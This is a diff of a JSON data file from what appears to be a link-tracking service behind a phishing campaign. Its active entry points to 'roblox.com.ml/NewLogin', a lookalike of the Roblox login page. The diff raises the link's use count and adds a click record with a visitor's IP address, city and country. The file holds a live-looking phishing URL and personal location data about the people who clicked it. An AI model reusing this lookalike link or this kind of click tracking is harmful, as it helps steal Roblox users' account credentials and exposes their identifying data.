@@ -110,7 +110,7 @@
     "targetUrl": "https://www.roblox.com.ml/NewLogin?returnUrl=https%3A%2F%2Fwww.roblox.com%2Fcommunities%2F296844474575%2FKeyPermanent",
     "createdAt": 1776592397121,
     "status": "active",
-    "useCount": 741,
+    "useCount": 742,
     "createdBy": "admin",
     "clicks": [
       {
@@ -6040,6 +6040,14 @@
         "city": "Georgetown",
         "flag": "🇬🇾",
         "countryCode": "GY"
+      },
+      {
+        "timestamp": 1777149226321,
+        "ip": "49.237.172.57",
+        "country": "Thailand",
+        "city": "Bangkok",
+        "flag": "🇹🇭",
+        "countryCode": "TH"
       }
     ]
   },
